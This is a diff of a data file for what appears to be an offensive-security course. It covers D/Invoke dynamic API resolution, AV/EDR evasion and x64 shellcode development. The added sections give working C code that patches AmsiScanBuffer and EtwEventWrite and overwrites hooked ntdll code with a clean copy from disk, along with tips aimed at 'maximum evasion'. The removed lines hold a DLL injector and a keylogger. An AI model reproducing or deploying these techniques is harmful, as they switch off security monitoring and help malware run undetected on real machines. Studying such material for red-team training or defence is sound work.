+3. Marshal.GetDelegateForFunctionPointer - Create callable delegate
+4. Dynamic delegate types matching function signature`,
+          example: {
+            title: "D/Invoke Pattern",
+            code: `using System;
+using System.Runtime.InteropServices;
+
+class DInvoke {
+    // Delegate matching VirtualAlloc signature
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    delegate IntPtr VirtualAllocDelegate(
+        IntPtr lpAddress,
+        uint dwSize,
+        uint flAllocationType,
+        uint flProtect
+    );
+    
+    // Minimal P/Invoke for bootstrapping
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+    static extern IntPtr GetModuleHandleW(string lpModuleName);
+    
+    static T GetDelegate<T>(string dll, string function) where T : Delegate {
+        IntPtr hModule = GetModuleHandleW(dll);
+        IntPtr pFunc = GetProcAddress(hModule, function);
+        return Marshal.GetDelegateForFunctionPointer<T>(pFunc);
+    }
+    
+    public static void Main() {
+        // Dynamically resolve VirtualAlloc
+        var virtualAlloc = GetDelegate<VirtualAllocDelegate>(
+            "kernel32.dll", 
+            "VirtualAlloc"
+        );
+        
+        // Call it without static import!
+        const uint MEM_COMMIT = 0x1000;
+        const uint MEM_RESERVE = 0x2000;
+        const uint PAGE_EXECUTE_READWRITE = 0x40;
+        
+        IntPtr mem = virtualAlloc(
+            IntPtr.Zero,
+            0x1000,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE
+        );
+        
+        Console.WriteLine($"[+] Allocated: 0x{mem.ToInt64():X}");
+        
+        // No "VirtualAlloc" in our import table!
+    }
+}`,
+            language: "csharp"
+          },
+          tip: `Combine D/Invoke with syscalls for maximum evasion - resolve ntdll functions dynamically, extract SSNs, and make direct syscalls from C#.`
         }
       ]
     },
     evasion: {
-      title: "Evasion Techniques",
-      description: "AV/EDR bypass and anti-analysis methods",
+      title: "AV/EDR Evasion Techniques",
+      description: "Bypassing security products through various evasion methods",
       sections: [
         {
           type: "intro",
-          content: `Evasion techniques help code avoid detection by security products. Understanding these is essential for both red teamers and defenders.`
+          content: `Modern endpoint security products use multiple detection layers: signature scanning, behavioral analysis, API hooking, and kernel callbacks. Effective evasion requires understanding and bypassing each layer. This module covers common evasion techniques used in red team operations.`
         },
         {
-          title: "AMSI Bypass",
-          content: `AMSI (Antimalware Scan Interface) lets Windows Defender scan scripts before execution. PowerShell, VBScript, and .NET use it.
+          title: "AMSI Bypass Techniques",
+          content: `The Antimalware Scan Interface (AMSI) provides a standardized interface for applications to request scans of content at runtime. PowerShell, VBScript, JScript, and .NET all use AMSI.
 
-**Common bypass methods:**
-1. Patch AmsiScanBuffer to return "clean"
-2. Unload the AMSI DLL
-3. Null out the AMSI context`,
-          concepts: [
-            { label: "AMSI", explanation: "Antimalware Scan Interface - scans scripts" },
-            { label: "AmsiScanBuffer", explanation: "The function that does the scanning" },
-            { label: "Patching", explanation: "Overwriting function code to change behavior" }
-          ],
+**How AMSI Works:**
+1. Application calls AmsiScanBuffer/AmsiScanString with content
+2. AMSI passes to registered provider (typically Windows Defender)
+3. Provider returns AMSI_RESULT (Clean, NotDetected, Detected)
+4. Application decides whether to execute
+
+**Bypass Strategies:**
+1. **Memory Patching** - Modify AmsiScanBuffer to return clean
+2. **amsiContext Corruption** - Null out the AMSI context
+3. **amsiInitFailed** - Force initialization failure
+4. **Provider Hijacking** - Redirect to benign provider
+5. **Reflection** - Use .NET reflection to modify internal state`,
+          warning: `AMSI bypasses are well-known and often detected. The bypass itself may trigger alerts. Obfuscation is essential.`,
           example: {
-            title: "AMSI Patch Concept",
-            description: "How AMSI patching works (educational):",
-            code: `// CONCEPT ONLY - for understanding
-// AmsiScanBuffer normally returns a scan result
-
-// The patch makes it return immediately with "clean"
-// By writing these bytes at the function start:
-
-// x64 patch bytes:
-// B8 57 00 07 80    mov eax, 0x80070057 (invalid param)
-// C3                ret
-
-// In code, you would:
-// 1. Get address of AmsiScanBuffer
-// 2. Change memory protection to RWX
-// 3. Write the patch bytes
-// 4. Restore protection
-
-// This is detected by most EDRs now!
-// They monitor for writes to amsi.dll`,
-            language: "c"
-          },
-          warning: `AMSI bypass is heavily monitored. Many bypass techniques are now signatures themselves.`
-        },
-        {
-          title: "API Unhooking",
-          content: `Security products "hook" functions by replacing their first bytes with a jump to monitoring code. Unhooking restores the original bytes.
-
-**The process:**
-1. Read a fresh copy of ntdll.dll from disk
-2. Find the hooked function
-3. Copy the original bytes back`,
-          example: {
-            title: "Unhooking Concept",
+            title: "AMSI Patch (Educational)",
             code: `#include <windows.h>
 #include <stdio.h>
 
-// Simplified unhooking concept
-void UnhookFunction(LPCSTR funcName) {
-    // 1. Get the hooked function address
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    FARPROC func = GetProcAddress(ntdll, funcName);
-    
-    // 2. Read fresh ntdll from disk
-    HANDLE hFile = CreateFileA(
-        "C:\\\\Windows\\\\System32\\\\ntdll.dll",
-        GENERIC_READ, FILE_SHARE_READ,
-        NULL, OPEN_EXISTING, 0, NULL
-    );
-    
-    // 3. Map it and find the original bytes
-    // (This is simplified - real code needs to 
-    // parse PE headers to find the function)
-    
-    // 4. Copy original bytes over the hook
-    // VirtualProtect + memcpy + VirtualProtect
-    
-    printf("Unhooking %s...\\n", funcName);
-    CloseHandle(hFile);
-}`,
-            language: "c"
-          },
-          tip: `Some EDRs now detect unhooking by monitoring reads of ntdll.dll from disk or by re-hooking functions.`
-        },
-        {
-          title: "Sleep Obfuscation",
-          content: `When malware sleeps (waits), its code is still in memory and can be scanned. Sleep obfuscation encrypts the code during sleep.
-
-**Techniques:**
-• Ekko - Uses timers to encrypt/decrypt
-• Foliage - Similar with different implementation
-• The code encrypts itself before sleeping, decrypts when waking`,
-          concepts: [
-            { label: "Sleep", explanation: "When code is waiting, not executing" },
-            { label: "Memory Scanning", explanation: "EDRs scan process memory for malware signatures" },
-            { label: "Encryption", explanation: "Making the code unreadable while sleeping" }
-          ]
-        },
-        {
-          title: "VM & Sandbox Detection",
-          content: `Malware often checks if it's running in a VM or sandbox before executing. If detected, it exits cleanly.
-
-**Common checks:**
-• VM processes (vmtoolsd.exe, vboxservice.exe)
-• VM registry keys
-• Disk size (sandboxes often have small disks)
-• Number of files (real systems have more files)
-• User interaction (sandboxes don't move the mouse)`,
-          example: {
-            title: "Simple VM Detection",
-            code: `#include <windows.h>
-#include <stdio.h>
-
-BOOL IsVM() {
-    HKEY hKey;
-    
-    // Check VMware
-    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-        "SOFTWARE\\\\VMware, Inc.\\\\VMware Tools",
-        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        RegCloseKey(hKey);
+// Patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN
+BOOL PatchAMSI() {
+    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
+    if (!hAmsi) {
+        printf("[*] AMSI not loaded\\n");
         return TRUE;
     }
     
-    // Check VirtualBox
-    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-        "SOFTWARE\\\\Oracle\\\\VirtualBox Guest Additions",
-        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        RegCloseKey(hKey);
-        return TRUE;
+    PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
+    if (!pAmsiScanBuffer) {
+        printf("[-] AmsiScanBuffer not found\\n");
+        return FALSE;
     }
     
-    return FALSE;
+    printf("[*] AmsiScanBuffer at: 0x%p\\n", pAmsiScanBuffer);
+    
+    // Patch bytes: xor eax, eax; ret (return 0 = clean)
+    // 31 C0 C3
+    unsigned char patch[] = { 0x31, 0xC0, 0xC3 };
+    
+    // Change memory protection
+    DWORD oldProtect;
+    if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch), 
+                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        printf("[-] VirtualProtect failed: %lu\\n", GetLastError());
+        return FALSE;
+    }
+    
+    // Apply patch
+    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
+    
+    // Restore protection
+    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
+    
+    printf("[+] AMSI patched!\\n");
+    return TRUE;
 }
 
-int main() {
-    if (IsVM()) {
-        printf("VM detected - exiting\\n");
-        return 0;
-    }
-    printf("Running on real hardware\\n");
-    return 0;
-}`,
-            language: "c"
-          }
-        }
-      ]
-    },
-    shellcode: {
-      title: "Shellcode Development",
-      description: "Position-independent code and payload development",
-      sections: [
-        {
-          type: "intro",
-          content: `Shellcode is raw, position-independent machine code. It's called "shellcode" because historically it was used to spawn a shell. Today it refers to any injectable code.`
-        },
-        {
-          title: "What Makes Shellcode Special?",
-          content: `Shellcode must work wherever it's loaded in memory. Normal programs rely on fixed addresses - shellcode can't do that.
-
-**Requirements:**
-• Position Independent (no hardcoded addresses)
-• Self-contained (no external dependencies)
-• Usually small and efficient
-• No null bytes (for string-based exploits)`,
-          concepts: [
-            { label: "PIC", explanation: "Position Independent Code - works at any address" },
-            { label: "RIP-relative", explanation: "x64 addressing relative to current instruction" },
-            { label: "Null-free", explanation: "No 0x00 bytes which could break string handling" }
-          ],
-          example: {
-            title: "Simple Shellcode - Return",
-            description: "The simplest shellcode just returns:",
-            code: `; x64 shellcode that just returns
-; Assembled bytes: C3
-
-ret     ; Just return to caller
-
-; To test:
-unsigned char code[] = { 0xC3 };
-
-LPVOID mem = VirtualAlloc(NULL, sizeof(code),
-    MEM_COMMIT | MEM_RESERVE, 
-    PAGE_EXECUTE_READWRITE);
-    
-memcpy(mem, code, sizeof(code));
-((void(*)())mem)();  // Execute it`,
-            language: "asm"
-          }
-        },
-        {
-          title: "Finding Functions Without Imports",
-          content: `Normal code uses the Import Address Table. Shellcode must find functions at runtime.
-
-**The technique (PEB walking):**
-1. Get PEB from the TEB
-2. Find the loader data
-3. Walk the module list to find kernel32.dll
-4. Parse its export table to find functions`,
-          example: {
-            title: "Finding Kernel32 (Pseudocode)",
-            code: `; Get PEB from TEB
-mov rax, gs:[0x60]    ; PEB pointer
-
-; Get Ldr (loader data)
-mov rax, [rax+0x18]   ; PEB->Ldr
-
-; Get first module in list
-mov rax, [rax+0x20]   ; InMemoryOrderModuleList
-
-; Walk the list to find kernel32.dll
-; (Check module name, keep walking until found)
-
-; Once found, parse the PE export table
-; to find GetProcAddress
-; Then use GetProcAddress to find everything else!`,
-            language: "asm"
-          },
-          tip: `Once you have GetProcAddress, you can find any function. It's the key to making shellcode work.`
-        },
-        {
-          title: "Writing Shellcode in C",
-          content: `You don't have to write shellcode in assembly! Write in C with special compiler settings.
-
-**The approach:**
-1. Write C code with no external dependencies
-2. Compile as position-independent
-3. Extract the .text section
-4. That's your shellcode!`,
-          concepts: [
-            { label: "-fPIC", explanation: "GCC flag for position-independent code" },
-            { label: "No CRT", explanation: "Don't link C runtime library" },
-            { label: "Intrinsics", explanation: "Compiler-built-in functions that don't need imports" }
-          ],
-          example: {
-            title: "Shellcode-friendly C",
-            code: `// Compile with special flags:
-// No standard library
-// Position independent
-// No stack protector
-
-// All functions must be resolved at runtime
-typedef void* (WINAPI *pLoadLibrary)(char*);
-typedef void* (WINAPI *pGetProcAddress)(void*, char*);
-
-void shellcode_main() {
-    // Get kernel32 base via PEB walking
-    void* kernel32 = find_kernel32();
-    
-    // Find GetProcAddress
-    pGetProcAddress gpa = find_export(
-        kernel32, "GetProcAddress");
-    
-    // Now use gpa to find other functions
-    pLoadLibrary ll = gpa(kernel32, "LoadLibraryA");
-    
-    // Load user32 and show a message box
-    void* user32 = ll("user32.dll");
-    // ... continue
-}`,
+// PowerShell equivalent (heavily obfuscated in practice):
+// [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+//   .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
             language: "c"
           }
         },
         {
-          title: "Encoding and Encryption",
-          content: `Raw shellcode contains signatures that AV can detect. Encoding or encrypting it helps evade detection.
+          title: "ETW Patching",
+          content: `Event Tracing for Windows (ETW) is a high-performance logging mechanism. Many security tools consume ETW events for visibility into process behavior.
 
-**Common techniques:**
-• XOR encoding (simple, fast)
-• AES encryption (stronger)
-• Custom encoders (unique to you)
+**ETW in Security:**
+• .NET runtime emits ETW for assembly loads, JIT compilation
+• PowerShell logs all script blocks to ETW
+• Process creation, network connections logged
+• Security tools subscribe to these events
 
-**The stub:**
-Your shellcode needs a decoder stub that runs first to decrypt the payload.`,
+**Bypass Approach:**
+Patch ntdll!EtwEventWrite to immediately return, preventing events from being generated.
+
+**Detection Concerns:**
+• ETW is also used by legitimate diagnostics
+• Patching may cause application instability
+• Some EDRs detect ETW tampering`,
           example: {
-            title: "XOR Encoder",
-            code: `#include <stdio.h>
-
-void xor_encode(unsigned char* data, int len, 
-                unsigned char key) {
-    for (int i = 0; i < len; i++) {
-        data[i] ^= key;
-    }
-}
-
-int main() {
-    // Original shellcode (just ret)
-    unsigned char shellcode[] = { 0xC3 };
-    unsigned char key = 0x41;
-    
-    printf("Original: ");
-    for (int i = 0; i < sizeof(shellcode); i++)
-        printf("%02X ", shellcode[i]);
-    
-    xor_encode(shellcode, sizeof(shellcode), key);
-    
-    printf("\\nEncoded:  ");
-    for (int i = 0; i < sizeof(shellcode); i++)
-        printf("%02X ", shellcode[i]);
-    
-    // At runtime, XOR again to decode
-    xor_encode(shellcode, sizeof(shellcode), key);
-    
-    printf("\\nDecoded:  ");
-    for (int i = 0; i < sizeof(shellcode); i++)
-        printf("%02X ", shellcode[i]);
-    
-    return 0;
-}`,
-            language: "c"
-          },
-          warning: `Simple XOR is easily detected. Modern AV can decrypt and scan. Use multiple layers of encoding.`
-        }
-      ]
-    },
-    labs: {
-      title: "Practical Labs",
-      description: "Build real security tools step-by-step",
-      sections: [
-        {
-          type: "intro",
-          content: `Time to put everything together! In these labs, you'll build real tools that demonstrate the concepts you've learned. Each lab includes complete working code.`
-        },
-        {
-          title: "Lab 1: Process Memory Dumper",
-          content: `Build a tool that dumps the memory of a running process. This is useful for malware analysis and debugging.
-
-**What you'll learn:**
-• Opening processes with the right permissions
-• Reading process memory
-• Saving data to files`,
-          example: {
-            title: "Process Dumper",
+            title: "ETW Bypass",
             code: `#include <windows.h>
 #include <stdio.h>
 
-BOOL DumpProcessMemory(DWORD pid, LPCWSTR outFile) {
-    HANDLE hProcess = OpenProcess(
-        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
-        FALSE, pid
-    );
+BOOL DisableETW() {
+    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+    if (!ntdll) return FALSE;
     
-    if (!hProcess) {
-        printf("Failed to open process: %lu\\n", 
-            GetLastError());
+    // Find EtwEventWrite
+    PVOID pEtwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
+    if (!pEtwEventWrite) {
+        printf("[-] EtwEventWrite not found\\n");
         return FALSE;
     }
     
-    HANDLE hFile = CreateFileW(outFile,
-        GENERIC_WRITE, 0, NULL,
-        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    printf("[*] EtwEventWrite: 0x%p\\n", pEtwEventWrite);
     
-    if (hFile == INVALID_HANDLE_VALUE) {
-        CloseHandle(hProcess);
+    // Patch: ret (just return immediately)
+    // Could also: xor eax, eax; ret (return STATUS_SUCCESS)
+    unsigned char patch[] = { 0xC3 };  // Simple ret
+    
+    DWORD oldProtect;
+    if (!VirtualProtect(pEtwEventWrite, sizeof(patch),
+                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
         return FALSE;
     }
     
-    SYSTEM_INFO si;
-    GetSystemInfo(&si);
+    memcpy(pEtwEventWrite, patch, sizeof(patch));
+    VirtualProtect(pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
     
-    MEMORY_BASIC_INFORMATION mbi;
-    LPVOID addr = si.lpMinimumApplicationAddress;
-    
-    while (addr < si.lpMaximumApplicationAddress) {
-        if (VirtualQueryEx(hProcess, addr, &mbi, 
-            sizeof(mbi)) == sizeof(mbi)) {
-            
-            if (mbi.State == MEM_COMMIT && 
-                (mbi.Protect & PAGE_READWRITE)) {
-                
-                BYTE* buffer = malloc(mbi.RegionSize);
-                SIZE_T bytesRead;
-                
-                if (ReadProcessMemory(hProcess, addr,
-                    buffer, mbi.RegionSize, &bytesRead)) {
-                    
-                    DWORD written;
-                    WriteFile(hFile, buffer, 
-                        bytesRead, &written, NULL);
-                }
-                free(buffer);
-            }
-            addr = (LPVOID)((DWORD_PTR)mbi.BaseAddress 
-                + mbi.RegionSize);
-        } else {
-            addr = (LPVOID)((DWORD_PTR)addr + 0x1000);
-        }
-    }
-    
-    CloseHandle(hFile);
-    CloseHandle(hProcess);
+    printf("[+] ETW patched!\\n");
     return TRUE;
 }`,
             language: "c"
           }
         },
         {
-          title: "Lab 2: DLL Injector",
-          content: `Build a complete DLL injector with error handling. This combines many concepts from the course.
+          title: "API Unhooking",
+          content: `EDR products hook API functions by modifying the first bytes (prologue) to redirect execution to their monitoring code. Unhooking restores the original bytes.
 
-**Features:**
-• Process selection by name or PID
-• DLL path validation
-• Proper cleanup`,
+**Hooking Indicators:**
+• JMP instruction at function start (E9 XX XX XX XX)
+• JMP [rip+offset] for 64-bit (FF 25 XX XX XX XX)
+• Unusual bytes where mov r10, rcx; mov eax, SSN expected
+
+**Unhooking Techniques:**
+1. **Fresh DLL mapping** - Map clean ntdll from disk, copy .text
+2. **Suspended process** - Read ntdll from newly created process
+3. **KnownDlls** - Read from \\KnownDlls\\ntdll.dll
+4. **Syscall reconstruction** - Rebuild syscall stubs from SSN
+
+**Fresh Copy Sources:**
+• C:\\Windows\\System32\\ntdll.dll (may be on-disk scanned)
+• \\KnownDlls\\ntdll.dll (section object)
+• Suspended child process memory`,
           example: {
-            title: "Complete DLL Injector",
+            title: "Unhook from Fresh DLL",
             code: `#include <windows.h>
-#include <tlhelp32.h>
 #include <stdio.h>
 
-DWORD FindProcess(const wchar_t* name) {
-    HANDLE snap = CreateToolhelp32Snapshot(
-        TH32CS_SNAPPROCESS, 0);
-    
-    PROCESSENTRY32W pe = { sizeof(pe) };
-    
-    if (Process32FirstW(snap, &pe)) {
-        do {
-            if (_wcsicmp(pe.szExeFile, name) == 0) {
-                CloseHandle(snap);
-                return pe.th32ProcessID;
-            }
-        } while (Process32NextW(snap, &pe));
-    }
-    
-    CloseHandle(snap);
-    return 0;
-}
-
-BOOL Inject(DWORD pid, const char* dllPath) {
-    printf("[*] Opening process %lu...\\n", pid);
-    
-    HANDLE hProc = OpenProcess(
-        PROCESS_CREATE_THREAD | 
-        PROCESS_VM_OPERATION |
-        PROCESS_VM_WRITE,
-        FALSE, pid
+BOOL UnhookNtdll() {
+    // Map fresh copy of ntdll from disk
+    HANDLE hFile = CreateFileW(
+        L"C:\\\\Windows\\\\System32\\\\ntdll.dll",
+        GENERIC_READ,
+        FILE_SHARE_READ,
+        NULL,
+        OPEN_EXISTING,
+        0,
+        NULL
     );
     
-    if (!hProc) {
-        printf("[!] OpenProcess failed: %lu\\n", 
-            GetLastError());
+    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
+    
+    HANDLE hMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
+    PVOID pCleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
+    
+    if (!pCleanNtdll) {
+        CloseHandle(hMapping);
+        CloseHandle(hFile);
         return FALSE;
     }
     
-    size_t len = strlen(dllPath) + 1;
+    // Get current ntdll base
+    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
     
-    printf("[*] Allocating memory...\\n");
-    LPVOID mem = VirtualAllocEx(hProc, NULL, len,
-        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    // Parse PE to find .text section
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pCleanNtdll;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)
+        ((PBYTE)pCleanNtdll + dosHeader->e_lfanew);
     
-    if (!mem) {
-        printf("[!] VirtualAllocEx failed\\n");
-        CloseHandle(hProc);
-        return FALSE;
-    }
-    
-    printf("[*] Writing DLL path...\\n");
-    if (!WriteProcessMemory(hProc, mem, 
-        dllPath, len, NULL)) {
-        printf("[!] WriteProcessMemory failed\\n");
-        VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
-        CloseHandle(hProc);
-        return FALSE;
-    }
-    
-    printf("[*] Creating remote thread...\\n");
-    HANDLE hThread = CreateRemoteThread(hProc,
-        NULL, 0,
-        (LPTHREAD_START_ROUTINE)LoadLibraryA,
-        mem, 0, NULL);
-    
-    if (hThread) {
-        WaitForSingleObject(hThread, 5000);
-        CloseHandle(hThread);
-        printf("[+] Injection successful!\\n");
-    }
-    
-    VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
-    CloseHandle(hProc);
-    return hThread != NULL;
-}
-
-int main(int argc, char* argv[]) {
-    printf("=== DLL Injector ===\\n\\n");
-    
-    DWORD pid = FindProcess(L"notepad.exe");
-    if (pid == 0) {
-        printf("Target not found\\n");
-        return 1;
-    }
-    
-    printf("[*] Found target: PID %lu\\n", pid);
-    Inject(pid, "C:\\\\path\\\\to\\\\your.dll");
-    
-    return 0;
-}`,
-            language: "c"
-          },
-          warning: `Only use on systems you own. Injection into other processes may trigger security alerts.`
-        },
-        {
-          title: "Lab 3: Simple Keylogger",
-          content: `Learn how input monitoring works by building a basic keylogger. This demonstrates Windows hooks.
-
-**Concepts:**
-• SetWindowsHookEx for keyboard hooks
-• Message loops
-• Low-level input handling`,
-          tip: `This is for educational purposes. Real keyloggers are illegal without consent!`,
-          example: {
-            title: "Keyboard Hook Example",
-            code: `#include <windows.h>
-#include <stdio.h>
-
-HHOOK hHook;
-FILE* logFile;
-
-LRESULT CALLBACK KeyboardProc(
-    int nCode, WPARAM wParam, LPARAM lParam) {
-    
-    if (nCode >= 0 && wParam == WM_KEYDOWN) {
-        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
-        
-        char key = MapVirtualKey(kb->vkCode, 
-            MAPVK_VK_TO_CHAR);
-        
-        if (key >= 32 && key <= 126) {
-            printf("%c", key);
-            if (logFile) {
-                fprintf(logFile, "%c", key);
-                fflush(logFile);
-            }
+    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
+    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
+        if (strcmp((char*)section[i].Name, ".text") == 0) {
+            PVOID localText = (PBYTE)hNtdll + section[i].VirtualAddress;
+            PVOID cleanText = (PBYTE)pCleanNtdll + section[i].PointerToRawData;
+            SIZE_T textSize = section[i].SizeOfRawData;
+            
+            // Make writable
+            DWORD oldProtect;
+            VirtualProtect(localText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+            
+            // Copy clean .text over hooked version
+            memcpy(localText, cleanText, textSize);
+            
+            // Restore protection
+            VirtualProtect(localText, textSize, oldProtect, &oldProtect);
+            
+            printf("[+] Restored %llu bytes of ntdll .text\\n", textSize);
+            break;
         }
     }
     
-    return CallNextHookEx(hHook, nCode, wParam, lParam);
-}
+    UnmapViewOfFile(pCleanNtdll);
+    CloseHandle(hMapping);
+    CloseHandle(hFile);
+    return TRUE;
+}`,
+            language: "c"
+          },
+          tip: `Combine unhooking with direct syscalls. Unhook first to evade inline hooks, then use syscalls to bypass any remaining user-mode monitoring.`
+        }
+      ]
+    },
+    shellcode: {
+      title: "Shellcode Development",
+      description: "Creating position-independent code for payload delivery",
+      sections: [
+        {
+          type: "intro",
+          content: `Shellcode is position-independent machine code that can execute from any memory address. Unlike normal executables, shellcode cannot rely on the loader - it must resolve its own dependencies at runtime. This module covers shellcode development fundamentals for x64 Windows.`
+        },
+        {
+          title: "Position-Independent Code Basics",
+          content: `Shellcode must work regardless of where it's loaded in memory. This requires specific coding techniques and avoiding certain constructs.
 
-int main() {
-    printf("[*] Keyboard monitor started\\n");
-    printf("[*] Press Ctrl+C to stop\\n\\n");
+**Key Requirements:**
+• No absolute addresses (no global variables)
+• No imports - must resolve dynamically
+• Self-contained - all data embedded in code
+• Avoid null bytes (for string-based exploits)
+
+**Accessing Data:**
+• LEA instruction with RIP-relative addressing
+• Call-pop technique to get current address
+• Delta offset calculation
+
+**Register Conventions (x64):**
+• RAX - Return value, SSN for syscalls
+• RCX, RDX, R8, R9 - First four arguments
+• R10 - Used instead of RCX for syscalls
+• GS - Points to TEB (segment register)`,
+          example: {
+            title: "RIP-Relative Data Access",
+            code: `; x64 NASM - Getting current address and data
+BITS 64
+
+section .text
+global _start
+
+_start:
+    ; Method 1: RIP-relative LEA
+    lea rax, [rel message]    ; Load address of message
     
-    logFile = fopen("keys.txt", "a");
+    ; Method 2: Call-pop technique  
+    jmp get_eip
+got_eip:
+    pop rbx                   ; RBX = address of 'got_eip'
+    ; Now calculate offsets from RBX
     
-    hHook = SetWindowsHookEx(
-        WH_KEYBOARD_LL,
-        KeyboardProc,
-        GetModuleHandle(NULL),
-        0
+    ; Method 3: Direct RIP-relative
+    lea rsi, [rip]            ; RSI = current instruction pointer
+    
+    ret
+
+get_eip:
+    call got_eip              ; Push return address and jump
+
+message:
+    db "Hello", 0             ; Embedded string data`,
+            language: "asm"
+          }
+        },
+        {
+          title: "Resolving Kernel32 and APIs",
+          content: `Shellcode must find kernel32.dll and resolve function addresses without using GetProcAddress (which itself needs to be resolved).
+
+**The Resolution Chain:**
+1. Access TEB via GS segment register
+2. Get PEB from TEB+0x60
+3. Get Ldr (PEB_LDR_DATA) from PEB+0x18
+4. Walk InMemoryOrderModuleList
+5. Find kernel32.dll (usually third entry)
+6. Parse PE exports to find GetProcAddress
+7. Use GetProcAddress for remaining functions
+
+**Module Order (typical):**
+1. Executable itself
+2. ntdll.dll
+3. kernel32.dll (or kernelbase.dll on Win7+)
+
+**Export Resolution:**
+Parse PE export directory:
+• AddressOfNames - Array of function name RVAs
+• AddressOfNameOrdinals - Ordinal index for each name
+• AddressOfFunctions - Array of function RVAs`,
+          example: {
+            title: "Finding Kernel32 Base Address",
+            code: `; x64 NASM - Get kernel32.dll base address
+BITS 64
+
+section .text
+global GetKernel32Base
+
+GetKernel32Base:
+    ; TEB is at gs:[0]
+    ; PEB is at TEB+0x60
+    mov rax, gs:[0x60]        ; RAX = PEB
+    
+    ; PEB_LDR_DATA is at PEB+0x18
+    mov rax, [rax + 0x18]     ; RAX = Ldr
+    
+    ; InMemoryOrderModuleList is at Ldr+0x20
+    mov rax, [rax + 0x20]     ; RAX = First entry (exe)
+    mov rax, [rax]            ; RAX = Second entry (ntdll)
+    mov rax, [rax]            ; RAX = Third entry (kernel32)
+    
+    ; DllBase is at entry+0x20 (in InMemoryOrder list)
+    mov rax, [rax + 0x20]     ; RAX = kernel32 base
+    
+    ret
+
+; More robust version checks DLL name instead of assuming order
+; Hash the DLL name and compare against known kernel32 hash`,
+            language: "asm"
+          },
+          tip: `On Windows 7+, the third module is often kernelbase.dll, not kernel32.dll. Robust shellcode should hash-compare module names rather than relying on load order.`
+        },
+        {
+          title: "Complete Shellcode Example",
+          content: `A complete shellcode implementation that resolves APIs and calls MessageBox.
+
+**Structure:**
+1. Get kernel32 base
+2. Find GetProcAddress export
+3. Resolve LoadLibraryA
+4. Load user32.dll
+5. Resolve MessageBoxA
+6. Call MessageBoxA with parameters
+7. Exit cleanly
+
+**Optimization Considerations:**
+• Minimize size (especially for buffer overflow exploits)
+• Avoid null bytes
+• Consider encoding/encryption for evasion`,
+          example: {
+            title: "MessageBox Shellcode Skeleton",
+            code: `; x64 Shellcode - Call MessageBoxA
+BITS 64
+
+section .text
+global _start
+
+_start:
+    ; Save registers (optional, for clean exit)
+    push rbp
+    mov rbp, rsp
+    sub rsp, 0x40                ; Shadow space + alignment
+    
+    ; ========== Get kernel32 base ==========
+    mov rax, gs:[0x60]           ; PEB
+    mov rax, [rax + 0x18]        ; Ldr
+    mov rax, [rax + 0x20]        ; InMemoryOrderModuleList
+    mov rax, [rax]               ; ntdll
+    mov rax, [rax]               ; kernel32 (or kernelbase)
+    mov r12, [rax + 0x20]        ; R12 = kernel32 base (save)
+    
+    ; ========== Find GetProcAddress ==========
+    ; Parse PE export directory
+    ; (Implementation omitted for brevity)
+    ; R13 = GetProcAddress address
+    
+    ; ========== Resolve LoadLibraryA ==========
+    lea rcx, [rel sLoadLibraryA] ; Function name
+    mov rdx, r12                 ; kernel32 base
+    ; call find_export          ; R14 = LoadLibraryA
+    
+    ; ========== Load user32.dll ==========
+    lea rcx, [rel sUser32]       ; "user32.dll"
+    call r14                     ; LoadLibraryA
+    mov r15, rax                 ; R15 = user32 base
+    
+    ; ========== Resolve MessageBoxA ==========
+    lea rcx, [rel sMessageBoxA]
+    mov rdx, r15
+    ; call find_export          ; RBX = MessageBoxA
+    
+    ; ========== Call MessageBoxA ==========
+    xor rcx, rcx                 ; hWnd = NULL
+    lea rdx, [rel sText]         ; lpText
+    lea r8, [rel sTitle]         ; lpCaption
+    xor r9, r9                   ; uType = MB_OK
+    call rbx
+    
+    ; ========== Clean exit ==========
+    add rsp, 0x40
+    pop rbp
+    ret
+
+; ========== Data Section ==========
+sLoadLibraryA: db "LoadLibraryA", 0
+sUser32:       db "user32.dll", 0
+sMessageBoxA:  db "MessageBoxA", 0
+sText:         db "Shellcode Executed!", 0
+sTitle:        db "Success", 0`,
+            language: "asm"
+          },
+          warning: `This is a skeleton - production shellcode needs proper export parsing, error handling, and often encoding to avoid detection. Never use hardcoded offsets across Windows versions.`
+        }
+      ]
+    },
+    labs: {
+      title: "Practical Security Labs",
